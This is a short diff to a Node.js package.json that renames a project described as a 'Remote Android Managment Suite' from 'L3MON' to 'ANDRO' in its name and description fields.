@@ -1,7 +1,7 @@
 {
-  "name": "L3MON",
+  "name": "ANDRO",
   "version": "1.0.0",
-  "description": "L3MON - Remote Android Managment Suite",
+  "description": "ANDRO - Remote Android Managment Suite",
   "main": "index.js",
   "scripts": {
     "test": "node index.js"
